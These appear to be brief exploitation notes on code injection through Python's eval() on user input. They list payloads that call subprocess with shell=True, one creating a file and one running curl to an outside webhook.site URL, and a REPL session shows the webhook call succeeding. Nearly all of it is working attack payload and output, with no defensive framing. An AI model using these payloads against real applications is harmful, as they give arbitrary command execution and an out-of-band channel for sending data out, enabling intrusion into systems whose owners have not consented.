- eval(ourinput)
- one way
- `__import__('subprocess').run(['touch testpage'],shell=True)`
- `__import__('subprocess').run(['curl https://webhook.site/db31d100-9c30-462b-bc60-0f3c967b42f0'],shell=True)`
```
>>> eval("__import__('subprocess').run(['curl https://webhook.site/db31d100-9c30-462b-bc60-0f3c967b42f0'],shell=True)")
<html>
<body>
body written at 1.30
</body>
</html>CompletedProcess(args=['curl https://webhook.site/db31d100-9c30-462b-bc60-0f3c967b42f0'], returncode=0)
>>> 

```
